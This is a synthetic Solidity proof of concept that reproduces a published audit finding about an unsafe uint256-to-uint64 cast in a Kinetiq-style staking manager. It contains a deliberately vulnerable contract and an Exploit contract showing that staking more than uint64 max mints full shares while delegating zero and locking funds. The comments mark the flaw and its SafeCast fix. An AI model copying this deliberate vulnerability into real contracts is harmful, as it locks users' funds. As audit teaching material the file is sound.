// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Kinetiq — [H-05] Funds can be permanently locked due to unsafe type cast
    (Pashov Audit Group, Kinetiq-security-review_2025-02-26, #58613)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: _distributeStake / L1Write path casts uint256→uint64 without
    SafeCast. For amount = type(uint64).max + 1 the cast truncates to 0:
    stake accepts full HYPE and mints full kHYPE, but 0 is delegated → funds
    sit on the manager with no recovery path.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal kHYPE share token.
contract KHYPE {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function burn(address from, uint256 amt) external {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        totalSupply -= amt;
    }
}

/// @dev L1Write stand-in — records the uint64 amount that would be delegated.
contract L1Write {
    address public lastValidator;
    uint64 public lastAmount;
    uint256 public delegateCalls;

    function sendTokenDelegate(address validator, uint64 amount, bool /*isUndelegate*/ ) external {
        lastValidator = validator;
        lastAmount = amount;
        delegateCalls += 1;
        // Does not pull ETH — in production this is a precompile/system call.
    }
}

/// @notice Reduced StakingManager with the unsafe uint64 cast on distribute.
contract StakingManager {
    KHYPE public immutable kHYPE;
    L1Write public immutable l1Write;
    address public currentDelegation;
    uint256 public totalStaked;
    uint256 public maxStakeAmount; // 0 = unlimited

    constructor(KHYPE _k, L1Write _l1, address _validator) {
        kHYPE = _k;
        l1Write = _l1;
        currentDelegation = _validator;
        maxStakeAmount = 0; // unlimited — precondition from the finding
    }

    function stake() external payable {
        require(msg.value > 0, "zero");
        if (maxStakeAmount > 0) {
            require(msg.value <= maxStakeAmount, "max");
        }
        totalStaked += msg.value;
        kHYPE.mint(msg.sender, msg.value);
        _distributeStake(msg.value);
    }

    function _distributeStake(uint256 amount) internal {
        address delegateTo = currentDelegation;
        require(delegateTo != address(0), "No delegation set");
        // Source: StakingManager — l1Write.sendTokenDelegate(delegateTo, uint64(amount), false);
        l1Write.sendTokenDelegate(delegateTo, uint64(amount), false); // @> VULN: unsafe uint256→uint64 cast; amount > type(uint64).max truncates (e.g. max+1 → 0)
        // FIX: l1Write.sendTokenDelegate(delegateTo, SafeCast.toUint64(amount), false);
    }

    receive() external payable {}
}

/// CREATE order: kHYPE (1), l1Write (2), manager (3).
contract Exploit {
    KHYPE public kHYPE;
    L1Write public l1Write;
    StakingManager public manager;

    uint256 public locked;
    uint64 public delegated;
    uint256 public minted;

    constructor() {
        kHYPE = new KHYPE(); // nonce 1
        l1Write = new L1Write(); // nonce 2
        manager = new StakingManager(kHYPE, l1Write, address(0xA11)); // nonce 3
    }

    function run() external payable {
        // type(uint64).max + 1 → uint64 cast = 0. ~18.45 ether — fundable in playground.
        uint256 amount = uint256(type(uint64).max) + 1;
        require(msg.value >= amount, "need >uint64.max HYPE");

        manager.stake{value: amount}();

        delegated = l1Write.lastAmount();
        locked = address(manager).balance;
        minted = kHYPE.balanceOf(address(this));

        // VULN effects:
        // - full kHYPE minted for `amount`
        // - L1 delegation recorded as 0
        // - full HYPE remains on manager (never delegated, no recovery)
        require(minted == amount, "full kHYPE minted");
        require(delegated == 0, "cast truncated to 0");
        require(locked == amount, "HYPE stuck on manager");
        require(l1Write.delegateCalls() == 1, "delegate attempted");
        require(locked > 0 && delegated == 0 && minted == locked, "harm not demonstrated");
    }

    receive() external payable {}
}
